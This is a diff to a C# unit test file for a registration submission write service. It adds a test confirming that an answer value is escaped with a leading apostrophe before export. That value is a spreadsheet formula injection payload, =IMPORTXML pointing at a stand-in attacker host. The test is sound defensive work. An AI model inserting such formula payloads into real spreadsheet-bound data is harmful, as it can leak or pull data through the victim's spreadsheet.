@@ -45,6 +45,17 @@ public sealed class RegistrationProviderSubmissionWriteEffectServiceTests
     }
 
     [Test]
+    public async Task SinkRequestUsesStableSubmissionIdentityAndNeutralizesSpreadsheetFormulas()
+    {
+        EffectScope scope = CreateScope(SinkBehavior.Accept, answerValue: "=IMPORTXML(\"https://evil.test\")");
+
+        await scope.Handler.Handle(new DrainRegistrationProviderSubmissionWriteEffectsCommand("worker"), CancellationToken.None);
+
+        await Assert.That(scope.Sink.LastRequest!.RegistrationSubmissionId).IsEqualTo(scope.Claim.RegistrationSubmissionId);
+        await Assert.That(scope.Sink.LastRequest!.Answers["email"]).IsEqualTo("'=IMPORTXML(\"https://evil.test\")");
+    }
+
+    [Test]
     public async Task EmptyResolvedAnswersWithTransferableMappingParksInsteadOfCompleting()
     {
         EffectScope scope = CreateScope(SinkBehavior.Accept, includeAnswers: false);
@@ -109,7 +120,10 @@ public sealed class RegistrationProviderSubmissionWriteEffectServiceTests
         await Assert.That((bool)isHeadlessBinding.Invoke(null, [writeOnly, sink])!).IsFalse();
     }
 
-    private static EffectScope CreateScope(SinkBehavior behavior, bool includeAnswers = true)
+    private static EffectScope CreateScope(
+        SinkBehavior behavior,
+        bool includeAnswers = true,
+        string answerValue = "attendee@example.test")
     {
         Guid tenantId = Guid.CreateVersion7();
         Guid eventId = Guid.CreateVersion7();
@@ -154,7 +168,7 @@ public sealed class RegistrationProviderSubmissionWriteEffectServiceTests
             Evidence("answers"), Now, RegistrationTransportIdempotencyHash.Create(Hash("transport")));
         RegistrationAnswer answer = RegistrationAnswer.CreateText(
             submission, field, requirement, RegistrationAnswerSubjectTypeEnum.RegistrationOrder,
-            orderId, 1, "attendee@example.test", Now);
+            orderId, 1, answerValue, Now);
         var delivery = new RegistrationProviderSubmissionWriteDelivery(attempt, submission, binding, includeAnswers ? [answer] : [], [field]);
         var claim = new RegistrationProviderSubmissionWriteClaim(
             Guid.CreateVersion7(), tenantId, submission.Id, attempt.Id, binding.Id,
